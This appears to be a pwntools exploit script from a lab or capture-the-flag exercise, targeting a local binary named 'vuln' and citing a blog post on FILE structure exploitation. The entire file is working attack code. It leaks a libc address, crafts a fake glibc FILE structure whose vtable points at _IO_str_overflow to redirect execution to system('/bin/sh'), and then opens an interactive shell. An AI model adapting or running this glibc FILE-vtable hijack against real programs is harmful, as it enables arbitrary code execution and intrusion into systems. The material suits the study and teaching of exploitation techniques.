"""
Exploit script for 'vuln'

https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/
"""

from pwn import *

# For gdb
context.terminal = ['tmux', 'splitw', '-h']

# A handy function to craft FILE structures
def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, "\x00")
    return struct

# Loading the vulnerable binary
bin = ELF("./vuln")
# Loading the updated libc
libc = ELF("libc.so.6")

# This makes sure that the process is started with the new libc instead of
# the one already present in the machine
env = {"LD_PRELOAD": os.path.join(os.getcwd(), "./libc.so.6")}
p = process("./vuln", env=env)

# Attaching with gdb, uncomment while debugging
#gdb.attach(p)

# Using the leaked libc address to calculate the base
p.recvline()
stdout_addr = u64(p.recvline().strip()[2:].decode('hex')[::-1] + "\x00\x00")
libc_base = stdout_addr - libc.symbols['_IO_2_1_stdout_']

# Our target
rip = libc_base + libc.symbols['system']
rdi = libc_base + next(libc.search("/bin/sh")) # The first param we want

# We can only have even rdi
assert(rdi%2 == 0)

# Crafting FILE structure

# This stores the address of a pointer to the _IO_str_overflow function
# Libc specific
io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
# Calculate the vtable by subtracting appropriate offset
fake_vtable_addr = io_str_overflow_ptr_addr - 2*8

# Craft file struct
file_struct = pack_file(_IO_buf_base = 0,
                        _IO_buf_end = (rdi-100)/2,
                        _IO_write_ptr = (rdi-100)/2,
                        _IO_write_base = 0,
                        _lock = bin.symbols['fake_file'] + 0x80)
# vtable pointer
file_struct += p64(fake_vtable_addr)
# Next entry corresponds to: (*((_IO_strfile *) fp)->_s._allocate_buffer)
file_struct += p64(rip)

file_struct = file_struct.ljust(0x100, "\x00")
 
p.send(file_struct)

# Launching shell
p.interactive()
